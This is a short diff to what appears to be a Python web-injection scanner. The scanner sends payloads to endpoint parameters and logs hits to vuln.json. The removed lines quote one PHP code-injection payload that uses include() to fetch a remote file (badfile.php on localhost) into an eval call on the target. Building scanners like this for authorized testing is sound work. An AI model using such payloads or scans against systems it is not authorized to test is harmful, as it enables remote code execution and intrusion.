@@ -37,17 +37,17 @@ for payload in payloads:
 		endpoint = ep["endpoint"]
 		method = ep["method"]
 		params = ep["param"]
+		values = ep["value"]
+		pvpair = dict(zip(params,values))
 		method = method.upper()
-		if payload[0] == '";include("http://localhost/badfile.php?");echo"' and endpoint == "eval2.php":
-			print ep
-			print (ij.injectPayload(endpoint,method,params[0],payload))
-'''		for param in params:
-			if (ij.injectPayload(endpoint,method,param,payload) == True):
+		for param in params:
+			if (ij.injectPayload(endpoint,method,param,pvpair,payload) == True):
+				pvpair[param]=payload[0]
 				listExploits[ij.getId(payload[1])]["results"][target].append(
 				{
 					"endpoint": endpoint,
-					"params":{param:payload[0]},
+					"params":pvpair,
 					"method": method
-				})		'''
+				})		
 with open("vuln.json", "w") as f:
 	f.write(json.dumps(listExploits, indent=4))
